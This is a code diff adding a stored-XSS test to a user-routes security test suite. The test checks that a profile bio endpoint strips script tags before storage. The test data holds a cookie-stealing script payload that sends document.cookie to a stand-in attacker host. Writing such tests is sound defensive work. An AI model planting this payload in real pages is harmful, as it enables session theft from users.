@@ -62,6 +62,21 @@ describe('User Routes Security Tests', () => {
     });
   });
 
+  describe('Stored XSS Prevention', () => {
+    it('XSS payload in bio is stripped before storage', async () => {
+      const xssPayload = "<script>fetch('https://evil.com?c='+document.cookie)</script>Clean bio";
+      const res = await request(app)
+        .patch('/api/users/profile')
+        .set('Authorization', `Bearer ${learnerA_Token}`)
+        .send({ bio: xssPayload });
+
+      expect(res.statusCode).toBe(200);
+      // Script tag must not appear in the stored value
+      expect(res.body.bio).not.toContain('<script>');
+      expect(res.body.bio).not.toContain('document.cookie');
+    });
+  });
+
   describe('Privilege Escalation Protection', () => {
     it('Sending role="admin" in profile update should be silently ignored (mass assignment prevention)', async () => {
       const res = await request(app)
